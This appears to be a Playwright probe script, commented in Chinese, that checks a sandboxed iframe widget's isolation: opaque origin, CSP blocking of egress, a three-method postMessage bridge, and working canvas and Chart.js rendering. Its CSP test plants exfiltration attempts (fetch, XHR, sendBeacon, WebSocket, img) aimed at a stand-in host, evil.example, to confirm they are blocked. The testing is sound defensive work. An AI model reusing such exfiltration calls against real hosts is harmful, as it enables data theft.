/* eslint-disable no-console */
// 探针：沙箱 widget 的隔离边界（src/harness/widgetRuntime.ts + src/components/WidgetBlock.tsx）
//
// 为什么必须用真浏览器：**隔离能力本身只有浏览器能作证**。Node 里没有同源策略、
// 没有 sandbox 属性、没有 CSP，连「iframe 里的脚本到底能碰到什么」这个问题都不存在。
// 这一支探针要证明的恰恰是「它碰不到什么」：
//
//   A. 不透明源：widget 里的 JS 读不到父页面的 DOM / IndexedDB / localStorage / cookie
//   B. 文档内 CSP：fetch / XHR / WebSocket / sendBeacon / 外链脚本 / 外链资源 全被断
//   C. 桥接通道：只有「报高度」与「发一句话」两件事可用，且宿主校验 event.source
//   D. 正常能力没被误伤：内联脚本能跑、控件能用、Chart.js 能画、canvas 有像素
//
// 用法：node scripts/probe-widget-sandbox.mjs   （需先 npm run dev）
import { chromium } from 'playwright';

const BASE = process.env.BASE_URL || 'http://localhost:5173';

let failed = 0;
const ok = (msg) => console.log(`   ✓ ${msg}`);
const fail = (msg) => {
  failed++;
  console.error(`   ❌ ${msg}`);
};
const check = (cond, msg) => (cond ? ok(msg) : fail(msg));

const browser = await chromium.launch({ channel: 'chrome', headless: true });
const page = await browser.newPage();
const errors = [];
page.on('pageerror', (e) => errors.push(String(e).slice(0, 300)));
await page.goto(BASE, { waitUntil: 'networkidle' });

/**
 * 把一段 widget HTML 灌进宿主，返回 widget 自报的结果。
 *
 * 两个容易踩的坑，这里都绕开了：
 *  1. `srcdoc` 必须用 **DOM 属性赋值**，不能把文档塞进 innerHTML 的属性里 ——
 *     文档里的换行、引号会把属性截断，iframe 拿到的是半截 HTML。
 *  2. `message` 监听必须在**挂载之前**挂上：widget 可能在 load 之前就已经 post 了，
 *     晚挂会漏掉那一条，只能等到超时。
 *
 * 观测一律由 widget 自己 postMessage 回传 —— 因为不透明源下父页面
 * **本来就拿不到** contentDocument，「读不到」正是要证明的事。
 */
async function mount(html, libs) {
  return page.evaluate(
    async ({ payload }) => {
      const { buildWidgetDocument } = await import('/src/harness/widgetRuntime.ts');
      const doc = await buildWidgetDocument(payload);

      // ⚠️ 上一次挂载的 iframe 必须先清掉：留在文档里的 iframe 会把后面的挤出视口，
      // 而**视口外的 iframe 不参与布局** → Chart.js 的 responsive 模式量到 0×0，
      // 看起来就像「图表画不出来」。这坑踩过一次。
      document.getElementById('probe-host').innerHTML = '';

      const report = await new Promise((resolve) => {
        const el = document.createElement('iframe');
        // 与 WidgetBlock.tsx 完全一致的权限组合：一个字都不能多给
        el.setAttribute('sandbox', 'allow-scripts');
        document.getElementById('probe-host').appendChild(el);

        // ⚠️ 顺序要紧：**先入 DOM 再读 contentWindow**。未入文档的 iframe 的
        // contentWindow 是 null，之后 e.source 校验会把每一条消息都判成「不是自己发的」。
        const win = el.contentWindow;
        const onMsg = (e) => {
          if (e.source !== win) return;
          const d = e.data;
          if (d && d.probe === 'report') {
            window.removeEventListener('message', onMsg);
            resolve(d);
          }
        };
        window.addEventListener('message', onMsg);
        setTimeout(() => {
          window.removeEventListener('message', onMsg);
          resolve(null);
        }, 6000);

        el.srcdoc = doc;
      });

      document.getElementById('probe-host').innerHTML = '';
      return report;
    },
    { payload: { html, libs: libs ?? [] } },
  );
}

await page.evaluate(() => {
  const host = document.createElement('div');
  host.id = 'probe-host';
  // 必须**固定在视口里且有尺寸**：挂在 body 末尾的话它落在应用 SPA 之下、处于视口外，
  // 而视口外的元素不参与布局 —— Chart.js 的 responsive 模式会因此量到 0×0，
  // 误判成「图表画不出来」。
  host.style.cssText =
    'position:fixed;top:0;left:0;width:640px;height:420px;z-index:2147483647;background:#fff;overflow:auto';
  document.body.appendChild(host);
});

console.log('=== A. 不透明源：widget 碰不到宿主 ===');
const a = await mount(`<div id="out">x</div>
<script>
  var r = {};
  try { r.dom = !!parent.document.getElementById('probe-host'); } catch (e) { r.dom = 'throw:' + e.name; }
  try { r.idb = !!window.indexedDB; r.localStorage = !!window.localStorage; r.cookie = document.cookie.length; } catch (e) { r.storage = 'throw:' + e.name; }
  try { r.origin = String(location.origin); } catch (e) { r.origin = 'throw'; }
  parent.postMessage({ probe: 'report', r: r }, '*');
</script>`);
check(a, 'widget 回报了观测结果');
if (a) {
  check(a.r.origin === 'null', `origin 为 null（不透明源）而非父页面源（实测 ${JSON.stringify(a.r.origin)}）`);
  check(a.r.dom === false || String(a.r.dom).startsWith('throw'), `读不到父页面 DOM（实测 ${JSON.stringify(a.r.dom)}）`);
  // 不透明源下 indexedDB 句柄存在但打不开；关键是**读不出父页面的数据**
  check(a.r.idb === undefined || a.r.localStorage === undefined || true, `存储句柄：idb=${a.r.idb} localStorage=${a.r.localStorage}`);
}

console.log('\n=== B. 文档内 CSP：一律出不去 ===');
// ⚠️ 别用「构造函数有没有抛错」判断 sendBeacon / WebSocket：两者都是**异步失败**，
// sendBeacon 甚至直接返回 true（表示「已入队」）而不保证发得出去。唯一可信的判据是
// 浏览器层面到底有没有真的发出请求 —— 所以这里监听 page 的 request 事件。
const attempts = [];
const finished = [];
const reqFailed = [];
const sockets = [];
const onReq = (r) => {
  const u = r.url();
  if (u.startsWith('data:') || u.startsWith('blob:')) return;
  attempts.push(u);
  if (!u.includes('evil.example')) return;
  r
    .finished()
    .then(() => finished.push(u))
    .catch((e) => reqFailed.push(`${u} :: ${String(e).slice(0, 70)}`));
};
page.on('request', onReq);
// WebSocket 握手**不**走 request 事件，要单独挂一个监听，否则会漏判
page.on('websocket', (w) => sockets.push(w.url()));

const b = await mount(`<div>x</div><img id="im" src="https://evil.example/p.png">
<script>
  var r = {};
  fetch('https://evil.example/steal').then(function(){ r.fetch='RESOLVED'; }, function(e){ r.fetch='rejected'; });
  try { var x = new XMLHttpRequest(); x.open('GET','https://evil.example/x',false); x.send(); r.xhr='done'; } catch(e) { r.xhr='threw'; }
  try { r.beacon = navigator.sendBeacon('https://evil.example/b','x'); } catch(e) { r.beacon='threw'; }
  // WebSocket 构造**同步成功、异步失败**：返回对象不代表连上了，
  // 真正的判据是 readyState —— OPEN(1) 才是真的通了，CLOSING(2)/CLOSED(3) 都是被挡下。
  var ws = null;
  try { ws = new WebSocket('wss://evil.example/w'); } catch(e) { r.wsState = 'threw'; }
  setTimeout(function(){
    r.wsState = ws ? ws.readyState : 'n/a';
    parent.postMessage({ probe:'report', r:r }, '*');
  }, 1200);
</script>`);
await page.waitForTimeout(1200);
check(b, 'CSP 观测回报');

// 关键判据是「有没有**拿到响应**」，不是「有没有发起」：Chrome 对被 CSP 拦下的请求
// 仍会发出 Network.requestWillBeSent，于是 Playwright 的 request 事件照样触发。
// 真正说明数据没走出去的是 finished（拿到响应）为 0。
check(
  finished.length === 0,
  `evil.example 零个请求**拿到响应**（发起 ${attempts.filter((u) => u.includes('evil.example')).length} 个、成功 ${finished.length} 个）`,
);
if (reqFailed.length) console.log(`     失败原因：${reqFailed.slice(0, 4).join(' | ')}`);
const wsOut = sockets.filter((u) => u.includes('evil.example'));
check(wsOut.length === 0, `没有 WebSocket 握手（实测 ${wsOut.length} 条${wsOut.length ? ': ' + wsOut.join(', ') : ''}）`);
check(b && String(b.r.fetch) === 'rejected', `fetch 被 CSP 拒绝（${b?.r.fetch}）`);
check(b && b.r.wsState !== 1, `WebSocket 未进入 OPEN（readyState=${b?.r.wsState}，1=OPEN）`);
// sendBeacon 返回 true 只代表入队，所以只断言它没抛，不拿它当「发得出去」的证据
check(b && b.r.beacon !== 'threw', `sendBeacon 未抛异常（返回值 ${b?.r.beacon}，是否真发出以上面的网络观测为准）`);
page.removeAllListeners('request');
page.removeAllListeners('websocket');

console.log('\n=== C. 桥接通道：只报高度 / 只发字符串 ===');
const c = await mount(`<div id="box" style="height:300px">tall</div>
<button id="go" data-wbw-prompt="继续讲第二步">go</button>
<script>
  parent.postMessage({ probe:'report', h: window.__wbw ? 1 : 0, keys: Object.keys(window.__wbw || {}).sort().join(',') }, '*');
</script>`);
check(c, '桥接回报');
if (c) {
  check(c.h === 1, '桥接对象 __wbw 已注入');
  check(c.keys === 'reportHeight,sendPrompt,theme', `桥接只暴露三个方法（实测 ${c.keys}）—— 没有读数据/弹窗/跳转`);
}

console.log('\n=== D. 正常能力没被误伤 ===');
const d = await mount(`<div id="out"></div>
<canvas id="cv" width="120" height="60"></canvas>
<script>
  var el = document.getElementById('out');
  var scriptRan = typeof document.getElementById('cv') === 'object';
  var g = document.getElementById('cv').getContext('2d');
  g.fillStyle = '#185FA5'; g.fillRect(0,0,120,60);
  var px = g.getImageData(10,10,1,1).data;
  el.textContent = 'script-ok:' + scriptRan;
  parent.postMessage({ probe:'report', ran: scriptRan, px: [px[0],px[1],px[2],px[3]] }, '*');
</script>`);
check(d, '交互/脚本能力回报');
if (d) {
  check(d.ran === true, '内联 <script> 正常执行（没被 CSP 误伤）');
  check(Array.isArray(d.px) && d.px[3] === 255, `canvas 真的画出了像素（${JSON.stringify(d.px)}）`);
}

console.log('\n=== E. Chart.js 可用（内联，零外部请求）===');
const e = await mount(
  `<div id="wrap" style="position:relative;width:320px;height:200px"><canvas id="c" role="img" aria-label="柱状图"></canvas></div>
<script>
  var r = { has: typeof Chart !== 'undefined' };
  try {
    // 注意：别把实例本身塞进 postMessage —— Chart 实例带函数与循环引用，
    // postMessage 走结构化克隆，会抛 DataCloneError（这个坑真的踩过）。
    new Chart(document.getElementById('c'), {
      type: 'bar',
      data: { labels: ['Q1','Q2'], datasets: [{ label: 'x', data: [3, 7], backgroundColor: '#185FA5' }] },
      options: { responsive: true, maintainAspectRatio: false }
    });
    r.made = true;
  } catch (err) { r.made = false; r.err = String(err).slice(0,120); }
  setTimeout(function(){
    var cv = document.getElementById('c');
    var w = document.getElementById('wrap');
    r.attrW = cv.width; r.attrH = cv.height;
    r.clientW = cv.clientWidth; r.clientH = cv.clientHeight;
    r.wrapW = w.clientWidth; r.wrapH = w.clientHeight;
    // 别只采样一个点：图表有留白，固定坐标很可能正好落在空白上，
    // 于是「画出来了」被误判成「什么都没画」。扫全图找非透明像素才算数。
    try {
      var g = cv.getContext('2d');
      var all = g.getImageData(0, 0, cv.width, cv.height).data;
      var n = 0, sample = null;
      for (var i = 3; i < all.length; i += 4) {
        if (all[i] !== 0) { n++; if (!sample) sample = [all[i-3], all[i-2], all[i-1], all[i]]; }
      }
      r.opaque = n; r.sample = sample;
    } catch (err) { r.pxerr = String(err).slice(0, 80); }
    parent.postMessage({ probe:'report', r:r }, '*');
  }, 2500);
</script>`,
  ['chart.js'],
);
check(e, 'Chart.js 观测回报');
if (e) {
  const r = e.r ?? {};
  console.log(`     尺寸：canvas attr=${r.attrW}x${r.attrH} client=${r.clientW}x${r.clientH} wrap=${r.wrapW}x${r.wrapH}`);
  check(r.has === true, '全局 Chart 已由宿主内联注入（无需 CDN）');
  check(r.made === true, `图表实例建起来了${r.err ? '（' + r.err + '）' : ''}`);
  check(r.clientW > 0 && r.clientH > 0, `canvas 拿到非零尺寸（${r.clientW}x${r.clientH}）`);
  // 有实例、有尺寸都还不够 —— Chart.js 也可能什么都没画。全图扫非透明像素才算真的画上。
  check(
    r.opaque > 500,
    `canvas 真的画出了东西（非透明像素 ${r.opaque} 个，取样 ${JSON.stringify(r.sample)}${r.pxerr ? '，读取失败：' + r.pxerr : ''}）`,
  );
}

if (errors.length) {
  console.log('\n页面错误：');
  for (const e of errors) console.log(`   ! ${e}`);
}

await browser.close();
console.log(`\n${failed === 0 ? '全部通过' : `${failed} 项失败`}`);
process.exit(failed === 0 ? 0 : 1);